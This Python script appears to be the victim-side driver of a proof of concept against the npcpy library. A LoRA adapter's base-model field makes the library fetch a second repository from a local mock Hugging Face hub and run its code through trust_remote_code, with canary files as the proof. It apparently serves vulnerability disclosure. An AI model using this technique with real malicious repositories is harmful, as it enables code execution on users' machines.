"""Victim-side driver: load ONE LoRA adapter package through npcpy's real public
entry point, with the local mock hub standing in for the Hugging Face endpoint.

The victim does nothing but hand npcpy the adapter directory - no provider flag,
no trust flag, no base-model argument:

    npcpy.llm_funcs.get_llm_response(prompt="...", model="<adapter dir>")
        -> lookup_provider() sees adapter_config.json -> provider "lora"
        -> gen/response.py:get_litellm_response (provider == 'lora')
        -> gen/response.py:get_lora_response -> reads base_model_name_or_path
        -> AutoTokenizer/AutoModelForCausalLM.from_pretrained(base_model_id,
                                                            trust_remote_code=True)

usage: python run_repro.py adapter_positive | adapter_negative
"""
import json
import os
import sys
from pathlib import Path

# npcpy prints emoji on this code path (response.py: "LoRA provider detected");
# keep stdout on UTF-8 so the run is not killed by the console code page.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # pragma: no cover - older interpreters
        pass
os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"

HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
PINNED = HERE / "npcpy-53ccf006"
PORT = 8766

name = sys.argv[1] if len(sys.argv) > 1 else "adapter_positive"
ADAPTER = WORK / name
REQLOG = WORK / "hub_requests.log"
CANARY = WORK / "canary" / name

# ---------------------------------------------------------------- environment
sys.path.insert(0, str(PINNED))
os.environ["HF_ENDPOINT"] = "http://127.0.0.1:%d" % PORT          # the mock hub
os.environ["HF_HOME"] = str(WORK / ("hf-home-" + name))           # fresh cache per run
os.environ["HF_HUB_DISABLE_TELEMETRY"] = "1"
os.environ["HF_HUB_DISABLE_SYMLINKS_WARNING"] = "1"
os.environ["HF_HUB_DISABLE_IMPLICIT_TOKEN"] = "1"
os.environ["NPCPY_POC_CANARY_DIR"] = str(CANARY)                  # where the canary lands
os.environ["NPCPY_POC_REPO"] = "?"                                # set after reading the adapter

if not ADAPTER.is_dir():
    sys.exit("adapter directory not found: %s (run: python make_poc.py)" % ADAPTER)

adapter_cfg = json.loads((ADAPTER / "adapter_config.json").read_text(encoding="utf-8"))
base_model_id = adapter_cfg.get("base_model_name_or_path")
os.environ["NPCPY_POC_REPO"] = str(base_model_id)

# fresh cache and empty canary directory, so every run really fetches and any
# canary file found afterwards was written during this run
import shutil  # noqa: E402
shutil.rmtree(os.environ["HF_HOME"], ignore_errors=True)
shutil.rmtree(CANARY, ignore_errors=True)
CANARY.mkdir(parents=True, exist_ok=True)
if REQLOG.exists():
    REQLOG.unlink()

import mock_hub  # noqa: E402

mock_hub.start_server(port=PORT, hub_root=str(WORK / "hub"), request_log=str(REQLOG))

print("[victim] adapter package : %s" % ADAPTER.relative_to(HERE))
print("[victim] adapter_config.json -> base_model_name_or_path = %r" % base_model_id)
print("[victim] canary directory : %s (empty at start: %s)"
      % (CANARY.relative_to(HERE), sorted(p.name for p in CANARY.iterdir()) == []))
print("[victim] mock hub        : http://127.0.0.1:%d  (stands in for huggingface.co)" % PORT)
print()

import npcpy  # noqa: E402
from npcpy.llm_funcs import get_llm_response  # noqa: E402

print("[victim] npcpy imported from: %s" % npcpy.__file__)
print("[victim] calling the public API the way a user would:")
print("[victim]   get_llm_response(prompt=..., model=%r)   # no provider, no trust flag" % str(ADAPTER))
print("-" * 78)

try:
    result = get_llm_response(
        prompt="In one short sentence: what is npcpy?",
        model=str(ADAPTER),
        max_tokens=24,
    )
    print("-" * 78)
    print("[victim] call returned, no exception raised")
    text = result.get("response") or ""
    print("[victim] response: %r" % (text if len(text) <= 200 else text[:200] + "...[truncated]"))
    if result.get("error"):
        print("[victim] error   : %r" % (result.get("error"),))
except Exception as exc:  # noqa: BLE001
    print("-" * 78)
    print("[victim] call raised %s: %s" % (type(exc).__name__, str(exc)[:300]))
    result = None

# ------------------------------------------------------------------- evidence
print("-" * 78)
lines = REQLOG.read_text(encoding="utf-8").splitlines() if REQLOG.exists() else []
gets = sorted({l for l in lines if l.startswith("GET ")})
print("[victim] repositories contacted (mock-hub request log, %d requests):" % len(lines))
for line in gets:
    print("[victim]   %s" % line)

canaries = sorted(CANARY.glob("*.txt"))
print("-" * 78)
print("[victim] canary files written by the fetched base-model repository: %d" % len(canaries))
for path in canaries:
    print("[victim]   %s:" % path.name)
    for row in path.read_text(encoding="utf-8").rstrip("\n").splitlines():
        print("[victim]     %s" % row)

hit_attacker = any("attacker/" in l for l in gets)
hit_trusted = any("trusted/" in l for l in gets)
print("-" * 78)
if canaries:
    print("[victim] RESULT: CODE FROM THE SECOND REPOSITORY WAS EXECUTED")
    print("[victim]         the adapter named %r, the load fetched it and its" % base_model_id)
    print("[victim]         .py modules ran on this machine before the model was built.")
elif hit_trusted:
    print("[victim] RESULT: redirect happened (the named repository was fetched) but that")
    print("[victim]         repository carries no code, so nothing executed.")
else:
    print("[victim] RESULT: unexpected - repositories contacted: attacker=%s trusted=%s"
          % (hit_attacker, hit_trusted))
